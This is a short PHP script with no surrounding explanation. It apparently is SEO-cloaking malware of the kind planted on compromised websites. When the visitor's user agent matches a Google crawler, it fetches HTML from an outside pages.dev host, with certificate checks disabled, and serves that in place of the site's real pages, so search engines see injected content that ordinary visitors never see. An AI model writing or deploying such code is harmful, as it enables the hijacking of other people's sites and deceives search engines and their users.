<?php
function is_google_crawler() {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    return preg_match('/Google(bot|-Site-Verification|-InspectionTool|bot-Mobile|bot-News)/i', $ua);
}

if (is_google_crawler()) {
    $remote_url = 'https://inidekss.pages.dev/ino.html';

    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => $remote_url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => "",
        CURLOPT_TIMEOUT => 10,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_HTTPHEADER => array(
            'User-Agent: Googlebot'
        ),
    ));

    $response = curl_exec($curl);
    $httpcode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    curl_close($curl);

    if ($httpcode === 200 && $response) {
        echo $response;
    }

    exit;
}
?>
